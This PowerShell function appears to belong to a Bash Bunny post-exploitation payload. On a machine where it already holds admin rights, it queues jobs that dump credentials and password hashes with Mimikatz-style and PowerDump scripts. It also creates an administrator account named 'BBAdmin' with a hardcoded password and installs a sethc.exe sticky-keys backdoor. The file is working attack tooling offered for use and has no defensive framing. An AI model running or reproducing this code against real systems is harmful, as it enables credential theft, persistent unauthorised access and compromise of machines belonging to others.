function Invoke-AdminJobs
{
    $jobslist = @(@{
        jobName = "Mimidogz"
        command = "Invoke-Mimidogz -DumpCred | out-string"
        runType = "thread"
        scriptName = "Invoke-Mimidogz.ps1"
    },
    @{
        jobName = "PowerDump"
        command = "Invoke-PowerDump | out-string"
        runType = "thread"
        scriptName = "Invoke-PowerDump.ps1"
    },
    @{
        jobName = "AddAdminUser"
        command = "Invoke-AddAdminUser -UserName `"BBAdmin`" -Password `"BBPassword1!`" | Out-String"
        runType = "thread"
        scriptName = "Invoke-AddAdminUser.ps1"
    },
    @{
        jobName = "SethcBD"
        command = "Invoke-SethcBD"
        runType = "thread"
        scriptName = "Invoke-SethcBD.ps1"
    })
    
    function Get-isHighIntegrity
    {
        $isAdmin = $false
        if(([Environment]::UserName).ToLower() -eq 'system') {
            $isAdmin = $true
        }else{
            # otherwise check the token groups
            $isadmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')
        }
        return $isAdmin
    }

    if( -not (Get-isHighIntegrity))
    {
        return "BashBunny is not running UACBypassed."
    }

    foreach($job in $jobslist)
    {
        if(Send-NewJob @job)
        {
            Write-Output ("Sent Job: {0} `r`n" -f ($job.jobName))
        }
        else
        {
            Write-Output("Sent Job: {0} failed. `r`n" -f ($job.jobName))
        }
        
    }
}
